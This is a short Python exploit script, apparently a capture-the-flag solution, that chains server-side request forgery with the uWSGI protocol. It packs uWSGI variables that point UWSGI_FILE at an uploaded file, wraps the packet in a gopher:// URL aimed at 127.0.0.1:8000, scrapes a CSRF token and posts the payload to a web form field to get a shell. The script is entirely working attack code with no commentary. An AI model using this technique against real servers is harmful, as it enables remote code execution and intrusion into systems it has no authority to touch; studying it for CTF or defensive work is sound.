# !/usr/bin/env python3
# -*- coding: utf-8 -*-

# built-in imports
import struct

from urllib.parse import quote
from typing import AnyStr, Dict

# third-party imports
import requests

# ************************* Modify ******************************

URL = "http://192.168.200.129:8080"
FILE = "/media/2021/05/16/fb08beef-ebce-41e5-9b75-1316552e102b"

# ***************************************************************


def sz(x: AnyStr):
    assert isinstance(x, (str, bytes))
    return struct.pack('h', len(x))


def pack_uwsgi_vars(vars: Dict):
    pk = b''
    for k, v in vars.items():
        pk += sz(k) + k.encode() + sz(v) + v.encode()
    return b'\x00' + sz(pk) + b'\x00' + pk


def generate_package(vars, body=b''):
    return pack_uwsgi_vars(vars) + body


def exp(file):
    vars = {
        'SERVER_PROTOCOL': 'HTTP/1.1',
        'REQUEST_METHOD': 'GET',
        'PATH_INFO': '/',
        'REQUEST_URI': '/',
        'QUERY_STRING': '',
        'SERVER_NAME': '',
        'HTTP_HOST': 'localhost:8000',
        'UWSGI_FILE': f'/usr/src/rwctf{file}',
        'UWSGI_APPID': 'app',
    }
    return f'gopher://127.0.0.1:8000/_{quote(generate_package(vars))}'


def get_shell(url, payload):
    sess = requests.session()
    csrf = sess.get(url).content.split(
        b'name="csrfmiddlewaretoken" value="')[1].split(b'"')[0]
    sess.post(url, data={'url': payload, 'csrfmiddlewaretoken': csrf})


payload = exp(FILE)
print(payload)
get_shell(URL, payload)
